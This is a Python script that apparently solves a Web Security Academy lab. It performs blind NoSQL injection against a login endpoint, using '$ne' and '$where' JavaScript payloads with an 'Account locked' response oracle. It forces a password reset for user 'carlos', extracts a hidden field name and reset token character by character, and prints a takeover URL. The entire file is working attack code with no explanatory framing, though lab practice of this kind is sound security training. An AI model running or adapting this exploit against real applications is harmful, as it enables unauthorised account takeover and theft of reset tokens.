import requests
import string
import sys
import re

TARGET_URL = "https://0a2b004b046829f480f70dcf0003001c.web-security-academy.net"
LOGIN_URL = f"{TARGET_URL}/login"
FORGOT_URL = f"{TARGET_URL}/forgot-password"
CHARSET = string.ascii_letters + string.digits + "-_"

def solve_lab():
    session = requests.Session()
    
    try:
        r = session.get(FORGOT_URL)
        csrf = ""
        match = re.search(r'name="csrf" value="(.*?)"', r.text)
        if match:
            csrf = match.group(1)
        
        data = {"username": "carlos", "csrf": csrf}
        session.post(FORGOT_URL, data=data)
        print("Password reset triggered for carlos.")
    except Exception as e:
        print(e)
        return

    hidden_field_name = ""
    
    for index in range(0, 10): 
        current_extracted = ""
        found_any_char = False
        
        sys.stdout.write(f"Index {index}: ")
        
        while True:
            found_char = False
            for char in CHARSET:
                payload = f"Object.keys(this)[{index}].match('^{current_extracted}{char}.*')"
                json_body = {
                    "username": "carlos", 
                    "password": {"$ne": "invalid"}, 
                    "$where": payload
                }
                
                try:
                    resp = session.post(LOGIN_URL, json=json_body)
                except:
                    continue

                if "Account locked" in resp.text:
                    current_extracted += char
                    found_char = True
                    found_any_char = True
                    sys.stdout.write(char)
                    sys.stdout.flush()
                    break
            
            if not found_char:
                break
        
        sys.stdout.write("\n")
        
        if not found_any_char:
            break
            
        if current_extracted not in ["_id", "username", "password", "email", "lock"]:
            hidden_field_name = current_extracted
            break

    if not hidden_field_name:
        print("Failed to find hidden field.")
        return

    print(f"Hidden Field: {hidden_field_name}")
    print("Extracting Token...")
    
    token_value = ""
    while True:
        found_char = False
        for char in CHARSET:
            payload = f"this.{hidden_field_name}.match('^{token_value}{char}.*')"
            json_body = {
                "username": "carlos", 
                "password": {"$ne": "invalid"}, 
                "$where": payload
            }
            
            resp = session.post(LOGIN_URL, json=json_body)
            
            if "Account locked" in resp.text:
                token_value += char
                found_char = True
                sys.stdout.write(char)
                sys.stdout.flush()
                break
        
        if not found_char:
            break
            
    print("\n" + "="*50)
    print(f"{hidden_field_name}={token_value}")
    print(f"{TARGET_URL}/forgot-password?{hidden_field_name}={token_value}")
    print("="*50)

if __name__ == "__main__":
    solve_lab()